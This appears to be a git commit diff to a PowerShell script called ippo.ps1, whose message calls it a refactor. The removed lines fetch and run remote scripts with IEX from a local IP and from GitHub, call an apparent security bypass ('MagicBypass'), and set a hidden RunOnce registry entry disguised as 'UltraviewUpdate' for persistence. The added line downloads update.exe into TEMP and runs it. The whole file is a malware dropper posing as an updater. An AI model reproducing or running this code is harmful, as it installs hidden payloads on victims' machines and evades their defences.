8e77ca2d7018d019707371c8ac370fb062a009fe
jia891 <phamly2tb@gmail.com>
2026-03-28 22:59:25 -0700

    Refactor script to streamline execution and update
    Removed multiple IEX commands and replaced with a single Invoke-WebRequest for update.exe.

--- ippo.ps1
+++ ippo.ps1
@@ -1,15 +1,1 @@
-IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a1.ps1'); IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a2.ps1'); IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.4:8000/a3.ps1'); MagicBypass;
-
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/ok/refs/heads/main/ippo.ps1'' | iex"' -Type String -Force
-
-for ($i = 1; $i -le 6; $i++) {
-   
-    $url = "https://raw.githubusercontent.com/jia891/ok/refs/heads/main/dc$i.ps1"
-    
-    
-    $webClient = New-Object System.Net.WebClient
-    $scriptContent = $webClient.DownloadString($url)
-    
-    
-    Invoke-Expression $scriptContent
-}
+$url="https://raw.githubusercontent.com/jia891/ok/refs/heads/main/update.exe"; $bat="$env:TEMP\update.exe"; Invoke-WebRequest $url -OutFile $bat; Start-Process $bat 
